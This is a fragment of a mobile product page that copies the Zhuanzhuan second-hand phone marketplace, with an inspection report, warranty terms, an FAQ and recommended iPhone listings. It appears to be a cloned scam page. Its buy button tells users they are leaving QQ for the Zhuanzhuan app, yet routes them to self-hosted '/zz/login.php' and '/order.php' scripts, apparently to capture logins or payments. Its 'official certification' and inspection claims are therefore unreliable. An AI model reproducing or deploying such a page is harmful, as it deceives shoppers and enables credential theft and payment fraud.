                <div data-v-0333544c="" data-v-41e57679="" class="qc-report-tab" data-v-516c4722="">
                  <div data-v-0333544c="" class="qc-title">
                    <div data-v-0333544c="" class="tt">
                      <span data-v-0333544c="" class="n">拆修浸液</span></div>
                    <div data-v-0333544c="" class="flex-con">
                      <div data-v-0333544c="" class="status">3项全通过
                        <i data-v-0333544c="" class="iconfont icon-checked"></i></div>
                      <i data-v-0333544c="" class="iconfont icon-angle-right icon-r arrow-down"></i>
                    </div>
                  </div>
                  <div data-v-0333544c="" class="qc-report-container" style="display: none;">
                    <dl data-v-0333544c="">
                      <dt data-v-0333544c="">
                        <p data-v-0333544c="">设备拆修痕迹</p></dt>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">维修痕迹</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">无维修痕迹</span></div>
                      </dd>
                    </dl>
                    <dl data-v-0333544c="">
                      <dt data-v-0333544c="">
                        <p data-v-0333544c="">机身浸液痕迹</p></dt>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">浸液痕迹</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">无浸液痕迹</span></div>
                      </dd>
                    </dl>
                    <dl data-v-0333544c="">
                      <dt data-v-0333544c="">
                        <p data-v-0333544c="">零件维修痕迹</p></dt>
                      <dd data-v-0333544c="" class="">
                        <div data-v-0333544c="" class="det">
                          <span data-v-0333544c="" class="k">零件维修或更换</span>
                          <span data-v-0333544c="" class="line"></span>
                          <span data-v-0333544c="" class="v">无维修痕迹</span></div>
                      </dd>
                    </dl>
                  </div>
                </div>
                <div data-v-5bfae138="" data-v-41e57679="" class="qc-report-tab" data-v-516c4722="">
                  <div data-v-5bfae138="" class="qc-title">
                    <div data-v-5bfae138="" class="tt">
                      <span data-v-5bfae138="" class="n">包装清单</span></div>
                    <div data-v-5bfae138="" class="flex-con">
                      <span data-v-5bfae138="" class="total-num">共1项</span>
                      <i data-v-5bfae138="" class="iconfont icon-angle-right icon-r arrow-down"></i>
                    </div>
                  </div>
                  <div data-v-5bfae138="" class="qc-report-container" style="display: none;">
                    <div data-v-5bfae138="" class="det">
                      <span data-v-5bfae138="" class="k">
                        手机</span>
                      <span data-v-5bfae138="" class="line"></span>
                      <span data-v-5bfae138="" class="v">1</span></div>
                  </div>
                </div>
              </div>
              <div data-v-4fea8908="" data-v-41e57679="" data-v-516c4722="">
                <div data-v-4fea8908="" class="qc-service">
                  <div data-v-4fea8908="" class="wrapper">
                    <div data-v-4fea8908="" class="services">
                      <div data-v-4fea8908="" class="service-item">
                        <div data-v-4fea8908="" class="name">
                          <p data-v-4fea8908="" class="left share-ins">
                            <img data-v-4fea8908="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAA7CAYAAAA5MNl5AAAAAXNSR0IArs4c6QAAB2ZJREFUaAXtWntsU1UY/31t14FAkJcSCSAPYxQlKqiIIkFhWxciRqJiJCvbEATjAxUigZCJEeUfUQEhPDv8R0REFPoYkhHRBYOJGkEBkc1XQBQQBmxs6z1+p13be3pvu3vbQobhJNs93/N8v/N+lJCcguWDoWl9QIKSRe2CJoRBHQ6icOVxfTyJYIMlYyBoNYQYpFdot3mivXC4ylC4dp+MMQok5L2fcVYDwtFuAzcNjM6DnHfAs+5gNHBNrL38QEhk4iog/K7MEUKlfREO/yaJyzQ1oaOjq4u71EAjAMcshvidkd8OOEJ4uCXm6CJxo4l6uSKzk9CxZVaC8Ph2JXHbB+mfwhWfHDAQHSPtI8SsovjfAHFlVQ1646qy4WgJT+I2durZqfN0Ep06LsOoFadS61iX5AZI6OVOCB/ndQidoVktnPv52fP9WPspqxbp9HLTtTqdlH4sQ4gHJMTReD7LTG5a5L519fCX3gPSxvI2x1rlOOkoCjwfARuyhBA1zw0Q6at4/Y/8X/7ZSOtt6KZXtVZ76X20C+kVIBk3g/jQ4vRsr4RL1yLVMzsj4A0huL2Bv+X2wmxb+9IAqa5wofHcJj60FfBfHm+VStoOzZ7GpQHSWLuCARTpQvtbl89J9uIDCXjnM4ipSrQOHFDoHBAXF0igZDKDeM0YJx008rLjXDwgodIHeCzwEdokiculRYLeIXyl9DFDcJvA4HNRl8ugRarKroMm/NylupqCAB1D8dIz5rLMubntWnKtaAlv53Dk9tw8Ue67lSwod5vGyFpRu4n7zW3mCFq5JI5Anl9iqccZgeGrzsfITL+5axHjWmEek4YyPoSdjf8dbzzHK/3hyLWUuYUlbm6AmK0VlopvVZLXtILPMlmk7IGkXCtsREU4jnwK2LAwqGYPBHjD4NUeo4mH6kSM8R2zZ6ZqO/hoanLbZfG4Kn2JLG8kiWbyJfSXalhpKLPnDqIwz1oOntPDqqXQeqqMNFT/gRPxZ+2dXCF8odyahOjGa8nGGJn663iHbzTNV/9URgLdFBFxVfbp948LXdx1qG9WZNDoWpWRhhpSwV0DXykawZK7FNqMIKpCUfFLgM9MmppHYgCHnkgCJ8AxOCIXZAR1pSVxd0Izg5xGN7RhdQgd6HHQY0ldoQ2riJhuVbX4NoZT62Cn7xWhwIMKbZcgMTilCdFpkOshHtz/ptRJJQiWd+etz0hVLPZIOgpE4NMkYW8Ep4xSeXaolC3C7380Sb4w2fEW19XCD3NePfMTbZPyKBC3OwkIS4SYLRUySiJFixDNRpEvmKFPfibUZim2RI3olf+55EWBjF19iGtqr6IEMR5yO55JIpMWIfLBU7kkE3cRm0DpeP7eotgLsTW2T2sdIywmLFaVmCPwlsKzQuye0Y1bs7uiSqhBvwHTFZ4dYn+Fmx+k3jSa5MVjTgApHLCFQ1f7rrz1CJR6jQ7ScM6dU2csot+R535ETpFprNKLfj0iz/03K0r8+onitd/GeAkgVKFx95oXE8S/QnsbgbIb43RbGUKPhAo/HwvXBIxd81eCZzPnLx3Ncb2SZBWG0zVfz0sAkdyiys1stEWvwKP+aqBlG+TUZyWJvK9ZTT7in+L+Oklfa1bMFR2/dxAovJlbI0/hEy1Bwbpv9LzELx9i3OopvdGgyVv15K1ADbq4iiCfEKwkeTWa0YLX6nxnSR9coGquyKSuisPo2mMoRi5p0IdhBCKlfm8BO/BzLnnO3gNXfhHGrTqtd5LzvHz717RqbolBqm+qRx7di3G+H1R+bPpN5hZXVsFBzyez2fEItDRuhahQu6RBMQvGjqk3MYgvTEBovFg8YQZClpY6oKLK5TyLGac8gdEI1g3LItTUpvKHPc3NNQziekVJLgSEGTyG5cWGaUoNRKp7NsxlrIsUS+nUCfv7JMWJCeGf8gIfBULRyUUnj4KYxovpKh3XkDUfI8lqQe8cDn8hF8ID2LEQ+ViKRp6WgaE8y32GnvmLYytssmmbdPW0nmi4sJJ9TzToElp4mE6FZ32lQZbEsAZEGvmfzcc1F5yRgAPe97n5J8d9EWrhcExHoW9HnGcl4/c+yQBkhRgPcvJoIehRyPFqIVkHoncW8O5jICb7MNoAd+cXMXb5Cb26Ib+zvD+aWlayjyKDLMKgI7zgTYj9qMxcR+WmHyOqrp4y7pYjUlGCpvoDfAR4GmZPbDWzOvId1nw0Ne9PCYKwFR1pmB0QsujMWkQGGdq+gMfNXA5IXXUTcH9i7/N4pvkEu151oqGuhDd+FazfN6Giz/EaIbciHt97eq7VfGZAYt7lNl9gDQc3IsYyfIlk7Xdmfn+DLMHgw5F7BorX/JFg2ctlB0SWJRfHQN0z/KuHRQxKBmw9yYs5h/M5FK7faN3IXDN7IDG/8jkh3CLXnBIGlN4vUTPrLeMLiIUZnd1jZeq+6QvUKVrO+stv593y69xUHqMN8Q9vxAc8NBfwtPqLUZ45J/dAYrGEvMMQFtO5bYbzelDPm6HdvH+rRIHv55jKla9JDfwHZVIwPSSerzEAAAAASUVORK5CYII=" alt="">30天质保</p>
                          <div data-v-4fea8908="" class="code">质检码：17241707
                            <span data-v-4fea8908="">复制</span></div>
                        </div>
                        <p data-v-4fea8908="" class="desc">此商品自签收起可享受转转提供的30天质保服务</p></div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
             <div data-v-41e57679="" data-v-516c4722="" class="qc-report-other" style="color:#ff8114">*外观问题、电池损耗及收货后人为损坏无法质保
</div>
</br>
<div data-v-41e57679="" data-v-516c4722="" class="qc-report-other" style="color:#ff8114">*如质检报告含亮斑、色斑、漏光、屏生线、老化发黄、
红屏等屏幕质检项,则[屏幕组件]类的问题,不保修
</div>
            <div data-v-41e57679="" data-v-516c4722="" class="qc-report-other">平台仅对设备本身在当前质检环境下的外观、屏幕显示、功能、拆修浸液进行客观检测，官换机、官修机、展示机、配件、卖家说明等不在检测内容范围内。</div>
            <div data-v-29f3dd3e="" data-v-41e57679="" data-v-516c4722=""></div>
            <div data-v-516c4722="" class="footer">转转手机3C产品质检研究院官方认证</div></div>
        </div>
      </div>
      <style>.zy-intro-bottom[data-v-2cbd58a9] { background: #fff; padding: 5.333vw 4.267vw; } .zy-intro-bottom img[data-v-2cbd58a9] { width: 100%; vertical-align: top; border-radius: 2.133vw; } .faq-wrap[data-v-da1c145e] { margin-bottom: 2.667vw; line-height: 1; background: #fff; } .faq-wrap h4[data-v-da1c145e] { padding: 5.333vw 4.267vw; font-size: 4.267vw; color: #111; } .faq-wrap ul[data-v-da1c145e] { padding: 0 4.267vw; font-size: 3.733vw; } ol, ul { margin: 0; padding: 0; list-style: none; } element.style { } .faq-wrap ul .tt1[data-v-da1c145e] { position: relative; padding-left: 5.333vw; margin-bottom: 3.2vw; color: #111; } .faq-wrap ul .tt1[data-v-da1c145e]:before { position: absolute; left: 0; top: 50%; -webkit-transform: translateY(-50%); transform: translateY(-50%); content: "问"; display: block; width: 3.733vw; height: 3.733vw; background-color: #e7e7e7; border-radius: .4vw; font-size: 2.667vw; line-height: 3.733vw; text-align: center; color: #fff; } .faq-wrap ul p[data-v-da1c145e] { padding-left: 5.333vw; margin-bottom: 5.333vw; line-height: 5.867vw; color: #999; } @media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 2dppx) .faq-wrap .btn[data-v-da1c145e] { border-top: none; } .faq-wrap .btn[data-v-da1c145e] { margin: 0 4.267vw; padding: 4vw 0; font-size: 3.733vw; color: #6d9cf8; text-align: center; position: relative; border-top: 1px solid #e7e7e7; } @media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 2dppx) .faq-wrap .btn[data-v-da1c145e]:before { content: ""; position: absolute; background-color: #e7e7e7; display: block; z-index: 1; top: 0; right: auto; bottom: auto; left: 0; width: 100%; height: 1PX; -webkit-transform-origin: 50% 100%; transform-origin: 50% 100%; -webkit-transform: scaleY(.5); transform: scaleY(.5); }</style>
      <div data-v-2cbd58a9="" class="zy-intro-bottom">
        <img data-v-2cbd58a9="" alt="" data-src="picture/yanji2.jpg" src="picture/yanji2.jpg" lazy="loaded"></div>
      <section data-v-da1c145e="" class="faq-wrap">
        <h4 data-v-da1c145e="">常见问题</h4>
        <ul data-v-da1c145e="" class="normal">
          <li data-v-da1c145e="">
            <div data-v-da1c145e="" class="tt1">1.用户寄卖商品的交易流程是怎样的？</div>
            <p data-v-da1c145e="">卖家将手机寄卖在平台，平台已经出具了手机评估报告，买家购买后由平台直接发货给买家。</p></li>
          <li data-v-da1c145e="">
            <div data-v-da1c145e="" class="tt1">2.用户寄卖商品和转转自营的手机一样吗？</div>
            <p data-v-da1c145e="">不一样。用户寄卖的手机均来自个人卖家，卖家将手机寄卖在平台，平台已质检完毕并出具详细报告，不是转转自营机器。</p></li>
          <li id="num_3" data-v-da1c145e="" style="display:none">
            <div data-v-da1c145e="" class="tt1">3.手机是平台发货吗？多久发货？</div>
            <p data-v-da1c145e="">用户寄卖的手机都寄存在平台，支付后由平台直接发货给买家。下单后，24小时内发货，平台包邮。</p></li>
          <li id="num_4" data-v-da1c145e="" style="display:none">
            <div data-v-da1c145e="" class="tt1">4. 7天无理由退货条件是什么？</div>
            <p data-v-da1c145e="">支持7天无理由的商品在签收后7日内，防拆标完好，无人为损坏/浸液/私修及无第三方维修，可申请7天无理由退货。</p></li>
          <li id="num_5" data-v-da1c145e="" style="display:none">
            <div data-v-da1c145e="" class="tt1">5. 什么情况下可以申请免费维修？</div>
            <p data-v-da1c145e="">商品自签收起30天内，出现非人为损坏导致，且属于验机评估报告中确认功能正常的所有设备主机部件的性能故障（电池/外观成色/意外损坏/偶发性问题不在质保范围内）。用户可在线申请维修，将商品寄至授权寄修服务中心，收件24小时内完成保内维修，包邮返还。 提醒：防拆标标志直接影响售后服务，私自撕毁防拆标或拆机将不享有保修服务</p></li>
          <li id="num_6" data-v-da1c145e="" style="display:none">
            <div data-v-da1c145e="" class="tt1">6.平台售后复检条件有哪些？</div>
            <p data-v-da1c145e="">商品自签收后7天内因商品与质检报告内容不符，可申请寄回平台复检，若复检描述问题属实，则平台承担有责售后给予退货。商品需无人为/外力/浸液等因素出现与质检报告描述内容不符问题，质检项已描述问题不在售后复检范围内。复检以质检报告描述为售后依据，卖家描述及第三方软件检测结果无法作为申请售后凭据。</p></li>
        </ul>
        <div id="show_btn" data-v-da1c145e="" onclick="shouqi()" class="btn">查看更多问题</div></section>
      <script>function shouqi() {

          if ($("#show_btn").text() == "收起更多问题") {
            $("#num_3").css("display", "none");
            $("#num_4").css("display", "none");
            $("#num_5").css("display", "none");
            $("#num_6").css("display", "none");
            $("#show_btn").text("查看更多问题");

          } else {
            $("#num_3").css("display", "");
            $("#num_4").css("display", "");
            $("#num_5").css("display", "");
            $("#num_6").css("display", "");
            $("#show_btn").text("收起更多问题");
          }

        }</script>
      <div data-v-2f387c1a="" data-v-5965d970="" class="section-services">
        <div id="recommend" class="more-to-love">
          <div class="detail-title">相关推荐</div>
          <div class="recommend-wrap">
            <ul class="recommend-list">
              <li>
                <a href="http://m.zhuanzhuan.com/">
                  <div class="recommend-list-box">
                    <img class="recommend-list-img" src="picture/n_x1159056016793452545.jpg">
                    <div class="recommend-list-cont">
                      <div>苹果 iPhoneX 64G 银色</div>
                      <div>
                        <div class="money-box">
                          <i>¥</i>
                          <em>2580</em></div>
                        <img src="picture/n_v2847691a5a60142a1aa18e1100c0721fe.png"></div>
                    </div>
                  </div>
                </a>
              </li>
              <li>
                <a href="http://m.zhuanzhuan.com/">
                  <div class="recommend-list-box">
                    <img class="recommend-list-img" src="picture/n_x1159049854836584448.jpg">
                    <div class="recommend-list-cont">
                      <div>苹果 iPhoneX 64G 深空灰色</div>
                      <div>
                        <div class="money-box">
                          <i>¥</i>
                          <em>3850</em></div>
                        <img src="picture/n_v2847691a5a60142a1aa18e1100c0721fe.png"></div>
                    </div>
                  </div>
                </a>
              </li>
              <li>
                <a href="http://m.zhuanzhuan.com/">
                  <div class="recommend-list-box">
                    <img class="recommend-list-img" src="picture/n_x1159048250645340160.jpg">
                    <div class="recommend-list-cont">
                      <div>苹果 iPhoneX 64G 深空灰色</div>
                      <div>
                        <div class="money-box">
                          <i>¥</i>
                          <em>3199</em></div>
                        <img src="picture/n_v2847691a5a60142a1aa18e1100c0721fe.png"></div>
                    </div>
                  </div>
                </a>
              </li>
              <li>
                <a href="http://m.zhuanzhuan.com/">
                  <div class="recommend-list-box">
                    <img class="recommend-list-img" src="picture/n_x1159044458495401986.jpg">
                    <div class="recommend-list-cont">
                      <div>苹果 iPhoneX 64G 深空灰色</div>
                      <div>
                        <div class="money-box">
                          <i>¥</i>
                          <em>4000</em></div>
                        <img src="picture/n_v2847691a5a60142a1aa18e1100c0721fe.png"></div>
                    </div>
                  </div>
                </a>
              </li>
              <li>
                <a href="http://m.zhuanzhuan.com/">
                  <div class="recommend-list-box">
                    <img class="recommend-list-img" src="picture/n_x1159043616644059136.jpg">
                    <div class="recommend-list-cont">
                      <div>苹果 iPhoneX 64G 银色</div>
                      <div>
                        <div class="money-box">
                          <i>¥</i>
                          <em>3599</em></div>
                        <img src="picture/n_v2847691a5a60142a1aa18e1100c0721fe.png"></div>
                    </div>
                  </div>
                </a>
              </li>
              <li>
                <a href="http://m.zhuanzhuan.com/">
                  <div class="recommend-list-box">
                    <img class="recommend-list-img" src="picture/n_x1159042912613359617.jpg">
                    <div class="recommend-list-cont">
                      <div>苹果 iPhoneX 64G 深空灰色</div>
                      <div>
                        <div class="money-box">
                          <i>¥</i>
                          <em>2400</em></div>
                        <img src="picture/n_v2847691a5a60142a1aa18e1100c0721fe.png"></div>
                    </div>
                  </div>
                </a>
              </li>
              <li>
                <a href="http://m.zhuanzhuan.com/">
                  <div class="recommend-list-box">
                    <img class="recommend-list-img" src="picture/n_x1159039663428657152.jpg">
                    <div class="recommend-list-cont">
                      <div>苹果 iPhoneX 64G 银色</div>
                      <div>
                        <div class="money-box">
                          <i>¥</i>
                          <em>4000</em></div>
                        <img src="picture/n_v2847691a5a60142a1aa18e1100c0721fe.png"></div>
                    </div>
                  </div>
                </a>
              </li>
              <li>
                <a href="http://m.zhuanzhuan.com/">
                  <div class="recommend-list-box">
                    <img class="recommend-list-img" src="picture/n_x1159038302595104768.jpg">
                    <div class="recommend-list-cont">
                      <div>苹果 iPhoneX 64G 深空灰色</div>
                      <div>
                        <div class="money-box">
                          <i>¥</i>
                          <em>4069</em></div>
                        <img src="picture/n_v2847691a5a60142a1aa18e1100c0721fe.png"></div>
                    </div>
                  </div>
                </a>
              </li>
              <li>
                <a href="http://m.zhuanzhuan.com/">
                  <div class="recommend-list-box">
                    <img class="recommend-list-img" src="picture/n_x1159038048428670979.jpg">
                    <div class="recommend-list-cont">
                      <div>苹果 iPhoneX 64G 深空灰色</div>
                      <div>
                        <div class="money-box">
                          <i>¥</i>
                          <em>3699</em></div>
                        <img src="picture/n_v2847691a5a60142a1aa18e1100c0721fe.png"></div>
                    </div>
                  </div>
                </a>
              </li>
              <li>
                <a href="http://m.zhuanzhuan.com/">
                  <div class="recommend-list-box">
                    <img class="recommend-list-img" src="picture/n_x1159037862159626240.jpg">
                    <div class="recommend-list-cont">
                      <div>苹果 iPhoneX 64G 深空灰色</div>
                      <div>
                        <div class="money-box">
                          <i>¥</i>
                          <em>2500</em></div>
                        <img src="picture/n_v2847691a5a60142a1aa18e1100c0721fe.png"></div>
                    </div>
                  </div>
                </a>
              </li>
            </ul>
          </div>
          <p class="tip">没有更多推荐啦</p></div>
        <div class="footer-nav">
          <div class="footer-nav-box">
            <span style="width: 30%;display: inline-block;">
            	  <div class="customer-service" onClick="kefu()">
                <div class="customer-service-icon"></div>
                <div>客服</div></div>
              <div id="want-buy" class="want-buy">
                <div class="want-buy-icon"></div>
                <div>收藏</div></div>
            
            </span>
            <div class="buy-btn">
              <div class="chat-btn"><a href="https://m.zhuanzhuan.com/u/bmmain/helpsale/fast-type?metric=heKxszoCyjNMbQooNsCyzg11208wfm&channel=BM_0104&type=B&__model=&bmFrom=SXKM-A">我也卖</a></div>
              <div class="go-buy">
                <a style="color: white" id="go_buy">立即购买</a>
              </div>
            </div>
          </div>
        </div>
        <style type="text/css">
          .am-dialog-mask {
              position: fixed;
              top: 0;
              left: 0;
              z-index: 100;
              width: 100%;
              height: 100%;
              background: rgba(0,0,0,.5);
          }
          .am-dialog-content {
            margin: auto;
            max-width: 320px;
            background: #fff;
            border-radius: 8px;
            padding: 25px 0 0;
        }
        .am-dialog-text {
            padding: 0 15px 25px;
            text-align: center;
            font-size: 14px;
            line-height: 150%;
        }
        .am-dialog-button[am-mode~=two] {
            display: -webkit-box;
           
        }
        </style>>
        <script>function yue99() {
            var yue999 = document.getElementById("yue999");
            yue999.style.display = "";
          }

          function yue90() {
            var yue999 = document.getElementById("yue999");
            yue999.style.display = "none";
          }

          //1000是多久被隐藏，单位毫秒
          //1000是多久被隐藏，单位毫秒
          </script>
        </script>
        <div data-v-943883c8="" id="fuwu" class="z-popup z-popup--bottom" style="width: 100%; z-index: 2009; display: none;">
          <div data-v-7e02fb92="" data-v-943883c8="" class="yp-service-popup">
            <div data-v-7e02fb92="" class="title">服务
              <i data-v-7e02fb92="" class="iconfont icon-x"></i></div>
            <ul data-v-7e02fb92="">
              <li data-v-7e02fb92="">
                <div data-v-7e02fb92="" class="name">
                  <div data-v-7e02fb92="" class="dot"></div>
                  <img data-v-7e02fb92="" data-src="picture/n_v215860c24da2041a1af47b0ef438e5947.png" src="./img3/n_v215860c24da2041a1af47b0ef438e5947.png" lazy="loaded">
                  <span data-v-7e02fb92="">已验机</span></div>
                <div data-v-7e02fb92="" class="desc">
                  <p data-v-7e02fb92="">官方验机服务，提供专业评估报告。</p></div>
              </li>
              <li data-v-7e02fb92="">
                <div data-v-7e02fb92="" class="name">
                  <div data-v-7e02fb92="" class="dot"></div>
                  <span data-v-7e02fb92="">24小时内发货</span></div>
                <div data-v-7e02fb92="" class="desc">
                  <p data-v-7e02fb92="">下单后，24小时内发货，顺丰邮寄（部分地区邮政邮寄）</p></div>
              </li>
              <li data-v-7e02fb92="">
                <div data-v-7e02fb92="" class="name">
                  <div data-v-7e02fb92="" class="dot"></div>
                  <span data-v-7e02fb92="">7天无理由退货</span></div>
                <div data-v-7e02fb92="" class="desc">
                  <p data-v-7e02fb92="">买家在商品签收后7天内可发起退货申请，退回商品应保证防拆标完好且无人为损坏，退货运费需由买家承担。</p></div>
              </li>
              <li data-v-7e02fb92="">
                <div data-v-7e02fb92="" class="name">
                  <div data-v-7e02fb92="" class="dot"></div>
                  <span data-v-7e02fb92="">30天质保</span></div>
                <div data-v-7e02fb92="" class="desc">
                  <p data-v-7e02fb92="">商品收货后可享受平台30天维修质保服务(质检时已有的功能异常、外观问题、电池损耗及收货后人为损坏无法质保)。</p></div>
              </li>
              <li data-v-7e02fb92="">
                <div data-v-7e02fb92="" class="name">
                  <div data-v-7e02fb92="" class="dot"></div>
                  <span data-v-7e02fb92="">质检消毒</span></div>
                <div data-v-7e02fb92="" class="desc">
                  <p data-v-7e02fb92="">1.佩戴口罩和手套：所有质检人员每天上岗前进行体温测量，佩戴口罩和手套后，才可进行质检。2.质检过程消毒：检测前，先对手机进行清洁和酒精擦拭消毒，再进行质检；检测后，对手机进行二次清洁和酒精擦拭，然后入库。3.装箱消毒：质检完成后装箱发送前，再进行酒精喷洒消毒。4.环境消毒：质检车间每天进行消毒处理。</p></div>
              </li>
            </ul>
            <div data-v-7e02fb92="" class="btn">确定</div></div>
        </div>
        <div class="z-overlay" style="z-index: 2008; animation-duration: 0.3s; display: none;"></div>
        <script src="js/jquery-2.0.3.min.js"></script>
        <script src="js/swiper.min.js"></script>
      <script>
          function kefu() {
              window.location.href="https://m.zhuanzhuan.com/common/loginsms/index.html?callbackUrl=https%3A%2F%2Fm.zhuanzhuan.com%2Fsystem%2Fzzappimservice%2Findex.html%3FskillId%3D10043%26robot%3D37%26metric%3Dq43xBlrQpFawmkKjhOSohQ112154ozt%26clientid%3Dypzy_yyj_a_sqxq%26infoid%3D1206131589709021195%26__tt%3D1576399885993#/login"
          }
          function liaoyiliao() {
              window.location.href="https://m.zhuanzhuan.com/common/loginsms/index.html?callbackUrl=https%3A%2F%2Fm.zhuanzhuan.com%2Fsystem%2Fzzappimservice%2Findex.html%3FskillId%3D10043%26robot%3D37%26metric%3Dq43xBlrQpFawmkKjhOSohQ112154ozt%26clientid%3Dypzy_yyj_a_sqxq%26infoid%3D1206131589709021195%26__tt%3D1576399885993#/login"
          }
      </script>
      <script> 
        
            var _goods=$('#goods');
            var _report=$('#report');
            var _seller=$('#seller');
            var _recommend=$('#recommend');
            var _scrollnav=$('.scroll-nav');
            // 滚动
            $(function () {
                $(window).scroll(function(){
                    var height1=$(window).scrollTop();
                    if (height1>50){$(".scroll-nav").css("display","flex");}else{$(".scroll-nav").hide();}
                    if(height1<_report.offset().top-70){
                        _scrollnav.find('a').eq(0).addClass('active').siblings().removeClass('active');
                    }
                    if(height1<_seller.offset().top-100 && height1>_report.offset().top-150){
                        _scrollnav.find('a').eq(1).addClass('active').siblings().removeClass('active');
                    }
                    if(height1<_recommend.offset().top-220 && height1>_seller.offset().top-100){
                        _scrollnav.find('a').eq(2).addClass('active').siblings().removeClass('active');
                    }
                    if(height1>=_recommend.offset().top-220){
                        _scrollnav.find('a').eq(3).addClass('active').siblings().removeClass('active');
                    }
                });
            });
            $('.scroll-nav a').on('click',function () {
                $(this).addClass('active').siblings().removeClass('active');
                var el=$(this).data('id');
                if(el=='report'){
                    $(window).scrollTop( _report.offset().top-73);
                }else if(el=='seller'){
                    $(window).scrollTop(_seller.offset().top-92);
                }else if(el=='recommend'){
                    $(window).scrollTop( _recommend.offset().top-92);
                }else if(el==='goods'){
                    $(window).scrollTop(0);
                }
            })



            $(document).on('click','.swiper-container .swiper-slide',function () {
                $('.img-view-box').show();
            })
            $(document).on('click','.img-view-box .swiper-slide',function () {
                $('.img-view-box').toggle();
            })
            $('.services-box1').on('click',function () {
                $('.services-pop-up').show();
            })
            $('.services-pop-up,.close-btn,.sure-btn').on('click',function () {
                $('.services-pop-up').hide();
            })

            $('.services-pop-up-box').on('click',function (e) {
                e.stopPropagation();
            })
            $('.more-questions').on('click',function () {
                $('.interact-list li:nth-of-type(n+3)').toggle();
            })
            $('.want-buy').on('click',function () {

                $('.want-buy .want-buy-icon').toggleClass('want-buy-iconed');
                $('.want-buy div:nth-of-type(2)').toggleClass('colorwant');
                if($('#want').hasClass('want-buy-iconed')){
                    // 取消想要
                }else{
                    // 点击想要
                }
            })
        </script>
    <script src="js/mui.js"></script>
    <script src="js/loading.js"></script>
    <script src="js/jquery.cookie.js"></script>
    <script>

      function getQueryVariable(variable)
    {
           var query = window.location.search.substring(1);
           var vars = query.split("&");
           for (var i=0;i<vars.length;i++) {
                   var pair = vars[i].split("=");
                   if(pair[0] == variable){return pair[1];}
           }
           return(false);
    }
    mui.init();
    $(".go-buy").click(function(){
        if(!$.cookie('_is_login')){ 
          mui.confirm("即将离开QQ<br>打开转转应用", " ", ["取消", "确认"], function (msg) {
              if (msg.index) {
                sessionStorage.setItem("login_auth","1");
                window.location.href = "/zz/login.php?weixin";
              }
          })
        }else{
          var _get_goods_id = getQueryVariable('ClickID');
          if(!_get_goods_id){
            var  _get_goods_id = $.cookie('GoodsID');
          }
          window.location.href = "/order.php?goods_id="+_get_goods_id;


        }
    });

    function  cuxiao(){
      $("#z-popup-radius").css("display","");
    }
    function  cuxiao1(){
      $("#cuxiao").css("display","");
    }
    function  shouhou(){
      $("#shouhou").css("display","");
    }
   function  close_icon(){
      $(".z-popup-radius").css("display","none");
    }

    $(".arrow-right").click(
        function(){
            $("#fuwu").css("display","");
            $(".z-overlay").css("display","");
        }
    )

    $(".more").click(
        function(){
            $(".z-popup").css("display","");
            $(".z-overlay").css("display","");
        }
    )

    $(".icon-x").click(
        function(){
            $(".z-popup").css("display","none");
            $(".z-overlay").css("display","none");
        }
    )

    $(".btn").click(
        function(){
            $(".z-popup").css("display","none");
            $(".z-overlay").css("display","none");
        }
    )

    //查看更多问答
    $(".checkmore").click(function(){
        //获取下面li标签
        var ddd = $(".faq-list li")
        for(var i=0;i<=ddd.length;i++){
            console.log(ddd[i])
            if($(ddd[i]).css("display") == "none"){
                $(".faq-list li").css("display",'')
                $(".checkmore").html("收起全部回答");
                return false;
            }else{
                if(i>1){
                    $(ddd[i]).css("display",'none')
                    $(".checkmore").html("查看全部回答");
                }

            }
        }

    })

    $(".qc-title").click(function(){
        console.log($(this).siblings('.qc-report-container'))
        if($(this).siblings('.qc-report-container').css('display') =='none'){
            $(this).siblings('.qc-report-container').css('display','');
        }else{

            $(this).siblings('.qc-report-container').css('display','none');
        }

    })

        </script>
      <script src="js/vue2.5.13.min.js"></script>
    <script src="js/swiper.min_1.js"></script>



  <script type="text/javascript">
        $(function () {
            $(".love").click(function () {
                if(!$(this).hasClass('active')){
                    $(this).addClass('active')


                }else{
                    $(this).removeClass('active')
                }
                    //? $(this).removeClass('active') : $(this).addClass('active')

            })

            $(".xuanxiangka").hide();
            $(".xuanxiangka>li").click(function () {
                $(this).addClass("active");
                $(this).siblings().removeClass("active");
            })



            $('.btn-buy').click(function () {
                location.href = $(this).attr('data-url');
            })

            var pic_w = $('.small_pic').width();
            $('.small_pic').height(pic_w);
            $(window).resize(function () {
                var pic_w = $('.small_pic').width();
                $('.small_pic').height(pic_w);
            });
        })
    </script>

<script>
    var swiper = new Swiper('.swiper-container', {
        slidesPerView: 1,
        spaceBetween: 30,
        loop: true,
        pagination: {
            el: '.swiper-pagination',
            clickable: true,
            type:'fraction'
        },
        navigation: {
            nextEl: '.swiper-button-next',
            prevEl: '.swiper-button-prev',
        },
        watchSlidesProgress : true,
    on:{
        touchStart: function(event){
          var aList = document.getElementsByClassName("list_nav");
          var aTab = document.getElementsByClassName("tab_nav");

          if(event.target.getAttribute('data-id')) {
            console.log(event.target.getAttribute('data-id'))
             
          }
          console.log(event.target,1324343333)
          aList[1].classList.add("active1");
          
          $("#pointOn").removeClass("active1"); 

        },
    },
    });
</script>
<script type="text/javascript">
  
function yuehao() {
    var yuehao01 = document.getElementById("yuehao01");
    yuehao01.style.display="";
}
function yuehao02() {
    var yuehao01 = document.getElementById("yuehao01");
    yuehao01.style.display="none";
}
function yue() {
    var yue01 = document.getElementById("yue01");
    yue01.style.display="";
}
function yue02() {
    var yue01 = document.getElementById("yue01");
    yue01.style.display="none";
}
function yue1() {
    var yue011 = document.getElementById("yue011");
    yue011.style.display="";
}
function yue102() {
    var yue011 = document.getElementById("yue011");
    yue011.style.display="none";
}


function yue8() {
    var yue88 = document.getElementById("yue88");
    yue88.style.display="";
}
function yue08() {
    var yue88 = document.getElementById("yue88");
    yue88.style.display="none";
}


function yue18() {
    var yue888 = document.getElementById("yue888");
    yue888.style.display="";
}
function yue28() {
    var yue888 = document.getElementById("yue888");
    yue888.style.display="none";
}

function yue20() {
    var yue8888 = document.getElementById("yue8888");
    yue8888.style.display="";
}
